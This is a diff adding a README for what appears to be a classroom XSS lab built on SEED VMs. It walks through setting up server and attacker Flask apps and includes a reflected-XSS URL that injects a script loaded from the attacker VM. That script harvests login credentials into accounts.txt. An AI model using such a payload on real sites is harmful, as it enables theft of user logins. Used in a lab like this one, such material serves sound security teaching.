@@ -1,0 +1,39 @@
+1. Create SEED VM and add it to a NAT Network in Virtual Box.
+
+2. Run the following commands to install dependencies:
+sudo pip install --upgrade pip
+sudo pip install Flask
+sudo pip install Flask-SQLAlchemy
+sudo pip install Flask-Session
+sudo pip install -U flask-cors
+
+3. Shut down VM, then Clone 2 times (we need total of 3 VMs).
+
+4. Add all VMs to same NAT Network and make sure they are able to ping each other.
+Check IPs with ifconfig.
+
+5. Extract attacker and server folders to unique VMs, note each VM's IP address.
+
+6. On server VM, generate user db by running script:
+python3 create_user_db.py
+
+7. Fill in the following URL with correct IPs:
+http://*SERVER*/login?status=<script type="text/javascript" src="http://*ATTACKER*/static/js/exploit.js"></script>
+
+Example:
+Server  : 10.0.2.5:5000
+Attacker: 10.0.2.6:5000
+http://10.0.2.5:5000/login?status=<script type="text/javascript" src="http://10.0.2.6:5000/static/js/exploit.js"></script>
+
+8. Run Flask on server and attacker VMs by navigating to folders extracted earlier and running commands:
+export FLASK_APP=server.py
+flask run --host=0.0.0.0
+
+9. Visit server from client VM (the one not running Flask server).
+Go through steps of logging in with one of these accounts:
+admin:password
+john:feb123
+
+10. Visit url from step 6 to showcase exploited login page. Attempt to login unsuccessfully, and then successfully.
+
+11. After successful login, navigate to folder on attacker VM and verify accounts.txt was created and accounts are visible.
